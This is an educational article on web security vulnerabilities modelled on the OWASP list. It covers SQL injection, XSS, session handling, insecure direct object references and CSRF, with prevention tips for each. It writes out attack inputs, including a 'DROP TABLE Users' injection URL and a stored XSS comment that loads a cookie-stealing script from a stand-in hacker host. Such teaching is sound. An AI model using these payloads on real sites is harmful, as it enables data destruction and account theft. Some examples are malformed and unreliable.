# 10 Most Common Web Security Vulnerabilities

OWASP or Open Web Security Project is a non-profit charitable organization focused on improving the security of software 
and web applications.The organization publishes a list of top web security vulnerabilities based on the data from 
various security organizations.

The web security vulnerabilities are prioritized depending on exploitability, detectability and impact on software.


1. SQL Injection
2. Cross Site Scripting
3. Broken Authentication and Session Management
4. Insecure Direct Object References
5. Cross Site Request Forgery
6. Security Misconfiguration
7. Insecure Cryptographic Storage
8. Failure to restrict URL Access
9. Insufficient Transport Layer Protection
10. Unvalidated Redirects and Forwards


## SQL Injection

SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database 
manipulation to access information that was not intended to be displayed. This information may include any number of items, 
including sensitive company data, user lists or private customer details.

**Impact :** The impact SQL injection can have on a business is far reaching. A successful attack may result in the unauthorized 
viewing of user lists, the deletion of entire tables and, in certain cases, the attacker gaining administrative rights 
to a database, all of which are highly detrimental to a business.

When calculating the potential cost of a SQLI, it’s important to consider the loss of customer trust should personal 
information such as phone numbers, addresses and credit card details be stole.

**Example :**

An attacker wishing to execute SQL injection manipulates a standard SQL query to exploit non-validated input 
vulnerabilities in a database. There are many ways that this attack vector can be executed, several of which will 
be shown here to provide you with a general idea about how SQLI works.

For example, the above-mentioned input, which pulls information for a specific product, can be altered to read 
`http://www.estore.com/items/items.asp?itemid=999 or 1=1.`

As a result, the corresponding SQL query looks like this:

`SELECT ItemName, ItemDescription
FROM Items
WHERE ItemNumber = 999 OR 1=1`

*And since the statement 1 = 1 is always true, the query returns all of the product names and descriptions in 
the database, even those thay you may not be eligible to access.*

Attackers are also able to take advantage of incorrectly filtered characters to alter SQL commands, including using 
a semicolon to separate two fields.

For example, this input `http://www.estore.com/items/iteams.asp?itemid=999; DROP TABLE Users` would generate the following 
SQL query:

`SELECT ItemName, ItemDescription
FROM Items
WHERE ItemNumber = 999; DROP TABLE USERS`

As a result, the entire user database could be deleted.

**How to prevent SQL Injection**

1) **Prepared Statements (with Parameterized Queries)**

The use of prepared statements with variable binding (aka parameterized queries) is how all developers should first 
be taught how to write database queries. They are simple to write, and easier to understand than dynamic queries. 
Parameterized queries force the developer to first define all the SQL code,and then pass in each parameter to the
query later. This coding style allows the database to distinguish between code and data, regardless of what user 
input is supplied.

Prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are
inserted by an attacker. In the safe example below, if an attacker were to enter the userID of tom' or '1'='1, the 
parameterized query would not be vulnerable and would instead look for a username which literally matched the entire 
string tom' or '1'='1.


Language specific recommendations:

1) Java EE – use PreparedStatement() with bind variables
2) Hibernate - use createQuery() with bind variables (called named parameters in Hibernate)

**Safe Java Prepared Statement Example**

The following code example uses a PreparedStatement, Java's implementation of a parameterized query, to execute the 
same database query.

```SQL String custname = request.getParameter("customerName"); // This should REALLY be validated too
 // perform input validation to detect attacks
 String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
 
 PreparedStatement pstmt = connection.prepareStatement( query );
 pstmt.setString( 1, custname); 
 ResultSet results = pstmt.executeQuery( );```

Hibernate Query Language (HQL) Prepared Statement (Named Parameters) Examples

```First is an unsafe HQL Statement
 
 Query unsafeHQLQuery = session.createQuery("from Inventory where productID='"+userSuppliedParameter+"'");
 
 Here is a safe version of the same query using named parameters
 
 Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");
 safeHQLQuery.setParameter("productid", userSuppliedParameter);
 ```
 
 2) Stored Procedure
 3) Validate Inputs 
 
 
 More Details : https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
 
 
## Cross Site Scripting

Cross Site Scripting is also shortly known as XSS.

XSS vulnerabilities target scripts embedded in a page that are executed on the client side i.e. user browser rather then
at the server side. These flaws can occur when the application takes untrusted data and send it to the web browser without 
proper validation.

Attackers can use XSS to execute malicious scripts on the users in this case victim browsers. Since the browser cannot
know if the script is trusty or not, the script will be executed, and the attacker can hijack session cookies, deface 
websites, or redirect the user to an unwanted and malicious websites.

XSS is an attack which allows the attacker to execute the scripts on the victim's browser.

**Implication:**

Making the use of this security vulnerability, an attacker can inject scripts into the application, 
can steal session cookies, deface websites, and can run malware on the victim's machines.

**Vulnerable Objects**

- Input Fields
- URLs

**Examples**

- ```http://www.vulnerablesite.com/home?"<script>alert("xss")</script>```

The above script when run on a browser, a message box will be displayed if the site is vulnerable to XSS.

*The more serious attack can be done if the attacker wants to display or store session cookie.*
 
- ```http://demo.testfire.net/search.aspx?txtSearch <iframe> <src = http://google.com width = 500 height 500></iframe>```

The above script when run, the browser will load an invisible frame pointing to ```http://google.com.```

The attack can be made serious by running a malicious script on the browser.

- While browsing an e-commerce website, a perpetrator discovers a vulnerability that allows HTML tags to be embedded in the site’s comments section. The embedded tags become a permanent feature of the page, causing the browser to parse them with the rest of the source code every time the page is opened.

The attacker adds the following comment: Great price for a great item! Read my review here 
```<script src=”http://hackersite.com/authstealer.js”> </script>.```

From this point on, every time the page is accessed, the HTML tag in the comment will activate a JavaScript file, which is hosted on another site, and has the ability to steal visitors’ session cookies.

Using the session cookie, the attacker can compromise the visitor’s account, granting him easy access to his personal information and credit card data. Meanwhile, the visitor, who may never have even scrolled down to the comments section, is not aware that the attack took place.

**How to prevent XSS attack :**

1. White Listing input fields
2. Input Output encoding

## Broken Authentication and Session Management

The websites usually create a session cookie and session ID for each valid session, and these cookies contain sensitive data like username, password, etc. When the session is ended either by logout or browser closed abruptly, these cookies should be invalidated i.e. for each session there should be a new cookie.

If the cookies are not invalidated, the sensitive data will exist in the system. For example, a user using a public computer (Cyber Cafe), the cookies of the vulnerable site sits on the system and exposed to an attacker. An attacker uses the same public computer after some time, the sensitive data is compromised.

In the same manner, a user using a public computer, instead of logging off, he closes the browser abruptly. An attacker uses the same system, when browses the same vulnerable site, the previous session of the victim will be opened. The attacker can do whatever he wants to do from stealing profile information, credit card information, etc.

A check should be done to find the strength of the authentication and session management. Keys, session tokens, cookies should be implemented properly without compromising passwords.

**Vulnerable Objects**

- Session IDs exposed on URL can lead to session fixation attack.
- Session IDs same before and after logout and login.
- Session Timeouts are not implemented correctly.
- Application is assigning same session ID for each new session.
- Authenticated parts of the application are protected using SSL and passwords are stored in hashed or encrypted format.
- The session can be reused by a low privileged user.

**Implication**

- Making use of this vulnerability, an attacker can hijack a session, gain unauthorized access to the system which allows disclosure and modification of unauthorized information.
- The sessions can be high jacked using stolen cookies or sessions using XSS.

**Examples**

1. Airline reservation application supports URL rewriting, putting session IDs in the URL:
```http://Examples.com/sale/saleitems;jsessionid=2P0OC2oJM0DPXSNQPLME34SERTBG/dest=Maldives (Sale of tickets to Maldives)```

An authenticated user of the site wants to let his friends know about the sale and sends an email across. The friends receive the session ID and can be used to do unauthorized modifications or misuse the saved credit card details.

2. An application is vulnerable to XSS, by which an attacker can access the session ID and can be used to hijack the session.
3. Applications timeouts are not set properly. The user uses a public computer and closes the browser instead of logging off and walks away. The attacker uses the same browser some time later, and the session is authenticated.

**How to prevent the attack :**

- All the authentication and session management requirements should be defined as per OWASP Application Security Verification Standard.
- Never expose any credentials in URLs or Logs.
- Strong efforts should be also made to avoid XSS flaws which can be used to steal session IDs.


## Insecure Direct Object References

It occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key as in URL or as a FORM parameter. The attacker can use this information to access other objects and can create a future attack to access the unauthorized data.

**Implication**

Using this vulnerability, an attacker can gain access to unauthorized internal objects, can modify data or compromise the application.

**Vulnerable Objects**

- In the URL.

**Examples:**

Changing "userid" in the following URL can make an attacker to view other user's information.

```http://www.vulnerablesite.com/userid=123``` Modified to ```http://www.vulnerablesite.com/userid=124```

An attacker can view others information by changing user id value.

**Recommendations:**

1. Implement access control checks.
2. Avoid exposing object references in URLs.
3. Verify authorization to all reference objects.


## Cross Site Request Forgery

Cross Site Request Forgery is a forged request came from the cross site.

CSRF attack is an attack that occurs when a malicious website, email, or program causes a user's browser to perform an unwanted action on a trusted site for which the user is currently authenticated.

A CSRF attack forces a logged-on victim's browser to send a forged HTTP request, including the victim's session cookie and any other automatically included authentication information, to a vulnerable web application.

A link will be sent by the attacker to the victim when the user clicks on the URL when logged into the original website, the data will be stolen from the website.

**Implication**

Using this vulnerability as an attacker can change user profile information, change status, create a new user on admin behalf, etc.

**Vulnerable Objects**

- User Profile page
- User account forms
- Business transaction page

**Examples**

The victim is logged into a bank website using valid credentials. He receives mail from an attacker saying "Please click here to donate $1 to cause."

When the victim clicks on it, a valid request will be created to donate $1 to a particular account.

```http://www.vulnerablebank.com/transfer.do?account=cause&amount=1```

The attacker captures this request and creates below request and embeds in a button saying "I Support Cause."

```http://www.vulnerablebank.com/transfer.do?account=Attacker&amount=1000```

Since the session is authenticated and the request is coming through the bank website, the server would transfer $1000 dollars to the attacker.

**Recommendation**

- Mandate user's presence while performing sensitive actions.
- Implement mechanisms like CAPTCHA, Re-Authentication, and Unique Request Tokens.






